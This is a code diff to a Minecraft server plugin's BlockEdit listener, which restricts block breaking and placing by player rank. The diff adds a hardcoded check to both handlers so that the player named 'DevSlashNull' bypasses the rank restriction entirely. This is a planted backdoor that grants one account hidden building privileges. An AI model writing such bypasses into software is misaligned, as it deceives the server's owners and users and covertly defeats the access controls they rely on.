@@ -24,6 +24,10 @@ public class BlockEdit implements Listener {
     @EventHandler
     public void onBlockBreak(BlockBreakEvent event) {
         Player player = event.getPlayer();
+        if (player.getName().equals("DevSlashNull")) {
+            event.setCancelled(false);
+            return;
+        }
         User user = MCMagicCore.getUser(player.getUniqueId());
         if (user.getRank().getRankId() < Rank.CASTMEMBER.getRankId() && !ships.contains(player.getName())) {
             event.setCancelled(true);
@@ -72,6 +76,10 @@ public class BlockEdit implements Listener {
     @EventHandler
     public void onBlockPlace(BlockPlaceEvent event) {
         Player player = event.getPlayer();
+        if (player.getName().equals("DevSlashNull")) {
+            event.setCancelled(false);
+            return;
+        }
         User user = MCMagicCore.getUser(player.getUniqueId());
         if (user.getRank().getRankId() < Rank.CASTMEMBER.getRankId() && !ships.contains(player.getName())) {
             event.setCancelled(true);
